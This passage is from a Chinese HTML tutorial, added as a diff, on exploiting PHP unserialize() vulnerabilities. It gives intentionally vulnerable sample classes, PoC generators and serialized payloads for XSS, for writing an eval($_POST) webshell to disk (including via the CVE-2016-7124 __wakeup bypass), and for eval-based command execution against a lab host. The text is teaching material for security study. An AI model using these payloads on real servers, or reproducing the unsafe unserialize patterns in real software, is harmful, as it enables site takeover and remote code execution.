+<li>反序列化得到A对象，其中<code>$test</code>属性的值为<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>在调用魔术方法<code>__destruct()</code>时将<code>$test</code>属性值直接打印到页面中触发XSS漏洞。</li>
+</ul>
+<h3 id="当目标对象被private、protected修饰时反序列化的利用"><a href="#当目标对象被private、protected修饰时反序列化的利用" class="headerlink" title="当目标对象被private、protected修饰时反序列化的利用"></a>当目标对象被private、protected修饰时反序列化的利用</h3><h4 id="产生条件-1"><a href="#产生条件-1" class="headerlink" title="产生条件"></a>产生条件</h4><ul>
+<li>反序列化对象的私有或受保护的属性值可控；</li>
+<li>触发魔术方法时将私有或受保护的属性值直接打印。</li>
+</ul>
+<h4 id="代码示例-1"><a href="#代码示例-1" class="headerlink" title="代码示例"></a>代码示例</h4><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name">A</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">protected</span> <span class="token variable">$test</span> <span class="token operator">=</span> <span class="token string">"demo"</span><span class="token punctuation">;</span>
+    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">test</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'value'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$a_unser</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre>
+<h4 id="利用方式-1"><a href="#利用方式-1" class="headerlink" title="利用方式"></a>利用方式</h4><p>先用如下代码输出利用的序列化串</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name">A</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">protected</span> <span class="token variable">$test</span> <span class="token operator">=</span> <span class="token string">"&lt;script>alert(1)&lt;/script>"</span><span class="token punctuation">;</span>
+    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">test</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment" spellcheck="true">// 输出</span>
+O<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"A"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token string">"*test"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">25</span><span class="token punctuation">:</span><span class="token string">"&lt;script>alert(1)&lt;/script>"</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre>
+<p>将序列化串作为参数传递，操作结果如下图所示。</p>
+<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/unserialize/php_vuln/受保护属性反序列化时导致的XSS.png" alt="受保护属性反序列化时导致的XSS"></center>
+
+<ul>
+<li><p>需要再次特别说明一点，对于private、protected修饰的属性序列化的字符串比较特殊</p>
+<pre class=" language-php"><code class="language-php"><span class="token function">protect</span><span class="token punctuation">(</span>受保护的<span class="token punctuation">)</span><span class="token punctuation">:</span>只有本类或子类或父类中可以访问
+s<span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token string">"%00*%00gender"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"女"</span><span class="token punctuation">;</span>
+
+<span class="token keyword">private</span><span class="token punctuation">(</span>私人的<span class="token punctuation">)</span><span class="token punctuation">:</span>只有本类内部可以使用
+s<span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">:</span><span class="token string">"%00UserInfo%00isGood"</span><span class="token punctuation">;</span>b<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">;</span></code></pre>
+</li>
+</ul>
+<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="file-put-contents-参数受反序列化控制的利用"><a href="#file-put-contents-参数受反序列化控制的利用" class="headerlink" title="file_put_contents()参数受反序列化控制的利用"></a><code>file_put_contents()</code>参数受反序列化控制的利用</h3><h4 id="代码示例-2"><a href="#代码示例-2" class="headerlink" title="代码示例"></a>代码示例</h4><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name">A</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string">"2.txt"</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token string">"test"</span><span class="token punctuation">;</span>
+    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token function">dirname</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'/'</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+
+payload<span class="token punctuation">:</span>
+http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//10.10.10.138/test.php</span>
+<span class="token operator">?</span>filename<span class="token operator">=</span>O<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"A"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"file"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"1.php"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"data"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">23</span><span class="token punctuation">:</span><span class="token string">"&lt;?php eval($_POST[1])?>"</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre>
+<h4 id="利用方式-2"><a href="#利用方式-2" class="headerlink" title="利用方式"></a>利用方式</h4><p>使用如下所示POC可以得到当前题目的payload。</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name">A</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string">"1.php"</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token string">"&lt;?php eval($_POST[1])?>"</span><span class="token punctuation">;</span>
+    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token function">dirname</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'/'</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment" spellcheck="true">// 输出</span>
+O<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"A"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"file"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"1.php"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"data"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">23</span><span class="token punctuation">:</span><span class="token string">"&lt;?php eval($_POST[1])?>"</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre>
+<p>payload执行结果如下图所示。</p>
+<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/unserialize/php_vuln/反序列化写一句话木马文件.png" alt="反序列化写一句话木马文件"></center>
+
+<ul>
+<li>反序列化后得到A对象，其中<code>$file</code>属性值为<code>1.php</code>，<code>$data</code>属性值为<code>&lt;?php eval($_POST[1])?&gt;</code>，在销毁A对象时触发<code>__destruct()</code>魔术方法，将一句话木马写入<code>1.php</code>文件中，蚁剑可以直接连接。</li>
+</ul>
+<h3 id="CVE-2016-7124-wakeup绕过"><a href="#CVE-2016-7124-wakeup绕过" class="headerlink" title="CVE-2016-7124 __wakeup绕过"></a><code>CVE-2016-7124 __wakeup</code>绕过</h3><h3 id="wakeup-魔法函数简介"><a href="#wakeup-魔法函数简介" class="headerlink" title="__wakeup()魔法函数简介"></a><code>__wakeup()</code>魔法函数简介</h3><p>调用<code>unserialize()</code>方法时会检查是否存在一个 <code>__wakeup()</code> 方法。如果存在，则会先调用 <code>__wakeup()</code> 方法，预先准备对象需要的资源。<br><font color="blue">反序列化时，如果表示对象属性个数的值大于真实的属性个数时就会跳过<code>__wakeup()</code>的执行</font>。</p>
+<h4 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h4><ul>
+<li><code>php5 &lt; 5.6.25</code></li>
+<li><code>php7 &lt; 7.0.10</code></li>
+</ul>
+<h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p><strong>实验环境</strong></p>
+<ul>
+<li><code>PHP5.6.9</code></li>
+</ul>
+<p><strong>代码示例</strong>：</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name">A</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token variable">$target</span> <span class="token operator">=</span> <span class="token string">"test"</span><span class="token punctuation">;</span>
+    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">target</span> <span class="token operator">=</span> <span class="token string">"wakeup!"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token variable">$fp</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"C:/phpstudy_pro/WWW/index/hello.php"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">target</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'test'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string">"hello.php"</span> <span class="token punctuation">.</span> <span class="token string">"&lt;br/>"</span><span class="token punctuation">;</span>
+<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"./hello.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre>
+<p>使用如下POC生成payload：</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name">A</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token variable">$target</span> <span class="token operator">=</span> <span class="token string">'&lt;?php eval($_POST[1])?>'</span><span class="token punctuation">;</span>
+    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">target</span> <span class="token operator">=</span> <span class="token string">'wakeup!'</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token variable">$fp</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"C:/phpstudy_pro/WWW/index/hello.php"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">target</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment" spellcheck="true">// 输出</span>
+O<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"A"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string">"target"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">23</span><span class="token punctuation">:</span><span class="token string">"&lt;?php eval($_POST[1])?>"</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre>
+<p>将序列化后的对象值个数修改成2以绕过<code>__wakeup()</code>魔术方法的执行，操作结果如下图所示。</p>
+<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/unserialize/php_vuln/反序列化绕过wakeup魔术方法写文件.png" alt="反序列化绕过wakeup魔术方法写文件"></center>
+
+<ul>
+<li>反序列化后得到A对象，由于对象数量大于真实个数未执行<code>__wakeup()</code>魔术方法，销毁对象时触发<code>__destruct()</code>魔术方法，将一句话木马写入<code>hello.php</code>文件中，写入完成后可以使用蚁剑进行连接。</li>
+</ul>
+<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><h3 id="同名方法的利用"><a href="#同名方法的利用" class="headerlink" title="同名方法的利用"></a>同名方法的利用</h3><h4 id="当目标被public修饰时反序列化漏洞的利用-1"><a href="#当目标被public修饰时反序列化漏洞的利用-1" class="headerlink" title="当目标被public修饰时反序列化漏洞的利用"></a>当目标被public修饰时反序列化漏洞的利用</h4><p><strong>代码示例</strong>：</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name">A</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token variable">$target</span><span class="token punctuation">;</span>
+    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">target</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">B</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">target</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">action</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">class</span> <span class="token class-name">B</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">function</span> <span class="token function">action</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token string">"action B"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">class</span> <span class="token class-name">C</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>
+    <span class="token keyword">function</span> <span class="token function">action</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token string">"action A"</span><span class="token punctuation">;</span>
+        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">test</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'test'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+payload<span class="token punctuation">:</span>
+http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//10.10.10.138/test.php</span>
+<span class="token operator">?</span>test<span class="token operator">=</span>O<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"A"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string">"target"</span><span class="token punctuation">;</span>O<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"C"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"test"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">:</span><span class="token string">"eval($_POST[1]);"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>
+<p><strong>利用方式</strong></p>
+<p>先使用如下代码输出序列化串。</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name">A</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token variable">$target</span><span class="token punctuation">;</span>
+    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">target</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">C</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">target</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">action</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">class</span> <span class="token class-name">B</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">function</span> <span class="token function">action</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token string">"action B"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">class</span> <span class="token class-name">C</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token variable">$test</span> <span class="token operator">=</span> <span class="token string">'phpinfo();'</span><span class="token punctuation">;</span>
+    <span class="token keyword">function</span> <span class="token function">action</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token string">"action A"</span><span class="token punctuation">;</span>
+        <span class="token comment" spellcheck="true">// eval($this->test);</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment" spellcheck="true">// 输出</span>
+O<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"A"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string">"target"</span><span class="token punctuation">;</span>O<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"C"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"test"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token string">"phpinfo();"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>
+<p>将上述序列化得到的字节序列作为参数进行传递，操作结果如下图所示。</p>
+<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/unserialize/php_vuln/同名方法公共属性反序列化引起的命令执行.png" alt="同名方法公共属性反序列化引起的命令执行"></center>
+
+
+
+<h4 id="当目标对象被private、protected修饰时反序列化的利用-1"><a href="#当目标对象被private、protected修饰时反序列化的利用-1" class="headerlink" title="当目标对象被private、protected修饰时反序列化的利用"></a>当目标对象被private、protected修饰时反序列化的利用</h4><p><strong>代码示例</strong>：</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name">A</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">protected</span> <span class="token variable">$test</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">test</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">B</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">test</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">action</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">class</span> <span class="token class-name">B</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">function</span> <span class="token function">action</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token string">"hello"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">class</span> <span class="token class-name">C</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">private</span> <span class="token variable">$data</span><span class="token punctuation">;</span>
+    <span class="token keyword">function</span> <span class="token function">action</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'test'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<p><strong>利用方式</strong>：</p>
+<p>先使用如下代码得到序列化串。</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name">A</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">protected</span> <span class="token variable">$test</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">test</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">C</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">test</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">action</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">class</span> <span class="token class-name">B</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">function</span> <span class="token function">action</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token string">"hello"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">class</span> <span class="token class-name">C</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">private</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token string">'phpinfo();'</span><span class="token punctuation">;</span>
+    <span class="token keyword">function</span> <span class="token function">action</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token comment" spellcheck="true">// eval($this->data);</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment" spellcheck="true">// 输出</span>
